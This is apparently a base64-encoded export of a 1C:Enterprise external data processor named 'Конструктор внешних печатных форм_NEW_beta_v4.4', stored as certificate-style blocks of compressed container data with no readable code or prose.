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
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0KMDAwMDAwMjYgMDAwMDAwMjYg
N2ZmZmZmZmYgDQoAAAAAAAAAAAAAAAAAAAAAAAAAAHYAZQByAHMAaQBvAG4AAAAA
AA0KMDAwMDAwMWMgMDAwMDAyMDAgN2ZmZmZmZmYgDQp7v3t/NS9XtZGhmY6BDpBh
YWBsaKBjUMvLBUIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAA0KMDAwMDAwMjggMDAwMDAwMjggN2ZmZmZmZmYgDQoA
AAAAAAAAAAAAAAAAAAAAAAAAAHYAZQByAHMAaQBvAG4AcwAAAAAADQowMDAwMDY2
OCAwMDAwMDY2OCA3ZmZmZmZmZiANCo2XT440Og3E7zLrCXL+Oc5xnMSR3uZ9CBAS
QpyMBUfiCvwyT2Lduxl1uuLYVeXq//77P//M3218f319a8shoju1aDO1dntaZ1lq
o+ZqYjvf8/0ly62rtXS1Lz4zSV7mTny8Q9few/XrO4aXNQ8wowGo0pKvrmmOFa3X
3Nson2H9Sb6+85piESVVdepZCzTdNdU5is6ue7t9f9Vtp3heyYbc1Pqdydx5RC9y
Sr4jx6KyfVbp5aQu9srbOXkdmsq6ZmvMGbd+hvUqu3W0ozxx+vLUCi+wPiyV7Wtq
VJ2h319t+AJnpTmVd8rmnVF38l7aHqWrVrAi97qj8sqlIzXvnvw07rTXLdmnL/kM
66eylmfzNtIpDy3ipJXLTqO9564rtzpok7aOo0n8vnce6hfZHN0+x7ah4fS/rhDK
SHHoQQOaRnDn7GH5NM8682dYr7LepEg7OXG8MAENJgCaXes9dxu9rO+v3ouWLCNl
vczcak3eTkttV5/r3OFevr5Hq+tMF55FuxozTausmma+TC60q7fPsF5l0u3MSqdu
h5Rtjc45g2ej0vYOI3sHzba6jPsYzZ3q0FrWTTrUq5dT74Vn1lef20cqJ3PnAdWP
Cqdc5jkuYfEZ1k9lNXJ16en6Ok8BkuapK0H94Jv69AHaLXu3OpME7W1Talp6aG+e
xeq84U5lPWvw0JOm0pJGLcmiz9Rn0J9luzT5DOunsiFtVlRkBeo23z1Z3rQQ4Ll8
Cez9/hpecxNumvmxUYW/LoO3I5L3CurfX99r5ZiVomrHKyDw4IBiD7eUDO9nOeUz
rFfZPEh10LPeGtMMip+8A800WBrLzlP6zHY9S6Rzfu6sj7C+U9+lHxTZQy6Vqd4p
jI8ankFiV9OeS+4u2X3YOPMzrFdZi3xGK4/yDJw/ZoIUltT5ypsrgwfN2n2dTmfw
WZvoz+vrRq0QV2/syTRzOXP2i861wYwq+BllJIaIhWCvFPcZ1qvs7LEW7cYO93OX
As/qjJTjyF42RS7ThLGojs6GawUNKTn/p5zH8CMBoePre6/luKMn7cErg6Mz8A9t
iNFYMiHxGdarzMLYKNPfmOHZzplpMtetQ7Z7PdZwDc9xxbOnagXWit40Mc5k009v
kCm7UZnK7UE3asvPBZgERC0JV8eBch/jls+wXmW1yvuHdvUKWkfzPltNqv0e1dz6
wh3dJLcsuONc1G+cssbECsaaZULVkqnMTuzmaNMHdwbWsQLPmruunRtbUT/E+nHa
otUVT0Qej2dl0LOzUt6268xbcMmHVkoUtn3VgNE6GgoGfPQR4WfEOgOesYT6YdvI
ohHM6W2n4L2ZlhlawmQ/w3qV7VFtD32BwNAwROOdla95jLW1/qHNVUVoNAISWW8j
Ur++UAF3zW+72thO/eBLCBTKXH+5hcW0sNsdN+44UWe1z7B+/GzPWsMDaWSU3g09
CT5ziC/abpTYTID9GX1AHm/vFKsPD5oVs69WTx1YDj0bFGQ+Z8pCZCFr4KH55rRX
QxrKpZfkteFifwEI+lGPrPlQWWlYIQHpZSSYMext0Mo+WY5OLvKcIwzobOtsl/r2
+SdYP2qqiCwK+2QMGETcwc+wt5s3vYcep5Fb9q8//+O33++vl3PaMxLDZegsidDT
ahQTlz2/Kiv4ORYaRIXY4o4MR3AViKuOAa8y69129+twwbJFD1gU0JB5skXv4DLz
uoAc+wzrvUQv/sSOTV3BaM9VpxHXxLQZlCNZgEYw2afOkuTet9k3fHtW2a5oCTld
BvOaGfOuGPalOahPXpAgCRBeVENIXG1/hvXDcVbzMqLQwWJRHzXahqF1HJSEadiB
SYHQrVVNWthhrWeyCQxKeohZpEHXjJfefVmnwZf7phuPB6bEGGTsvsdlu9lnWK+y
5b1t8kw6klGfNaa5o79AtltpRWZGy7eLRiaMdFT9dgH7ynN/22yRKXvGd3/eeU49
2rkmnpYPnSH6L9L5rmOIx+nUdu9lId+321nr7Y1yZZGf89i/7ZYPm/FiSUoeIrrW
P9I5vKS348I/6RQUn2H9vPNsNAJ9+FVR3qfode43OMzA5e1y3vmXX7/+xs04TpTG
DwHUS4d5j01WBD9drt6uo142/N/jL3/97dfvCGjLOjY1ISqsdXl+y5xdx08S4foV
Jf//+F+xTyN248+Q/sUk2UquN24rKy8jp9c7/vU/
-----END CERTIFICATE-----"}
},
{0,
{"Конструктор внешних печатных форм_NEW_beta_v4.4",0,0,"","-----BEGIN CERTIFICATE-----
////fwACAAAjAAAAAAAAAA0KMDAwMDAxYTQgMDAwMDAyMDAgN2ZmZmZmZmYgDQov
AgAArgIAAP///3/NBAAAUAUAAP///39dMQAA3DEAAP///3/7MwAAfjQAAP///39/
OgAA/joAAP///38dPQAAoD0AAP///3/9RAAAfEUAAP///3+bRwAAHkgAAP///389
SgAAvEoAAP///3/bTAAAXk0AAP///38KWAAAiVgAAP///3+oWgAAK1sAAP///39K
XQAAyV0AAP///3/oXwAAa2AAAP///39kDwEA4w8BAP///38CEgEAhRIBAP///3+U
NAEAEzUBAP///38yNwEAtTcBAP///38ccwEAm3MBAP///3+yiwEAMYwBAP///39Q
jgEA044BAP///3/ykAEAcZEBAP///3+QkwEAE5QBAP///3+c1QEAH9YBAP///3//
BQIAggYCAP///3+hCAIAIAkCAP///38/CwIAwgsCAP///39NrQIAzK0CAP///3/r
rwIAbrACAP///3+NsgIADLMCAP///38rtQIArrUCAP///3+4wAIA/8ACAP///3+A
zQIAv80CAP///3/ezwIAI9ACAP///39C0gIAidICAP///38AAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0KMDAwMDAwNjAgMDAwMDAw
NjAgN2ZmZmZmZmYgDQoQjfldlEICABCN+V2UQgIAAAAAADAAYQAwADUAOQBiADUA
ZgAtADkAYQAyAGEALQA0AGUAYQA2AC0AYQAzADYAOQAtAGIAYQA2AGEANABkADcA
OAA3ADkAOAA4AAAAAAANCjAwMDAwMDg4IDAwMDAwMjAwIDdmZmZmZmZmIA0Ke797
f7WhDi9XtZEOmAITBjpAmGhgaplkmqZrmWiUqGuSmmimm2hsZqmblGiWaJJibmFu
aWFRq6N0YcWFDRc2Xth9Yd+FvRcmAfHWix0g8sLOC/OB7PYLGy42Afn7LuyMv7D4
whIliB1KRaVKqHoVLmxC1qxwYT+qbgWwbqCFSiC31fJy1QJJAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
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
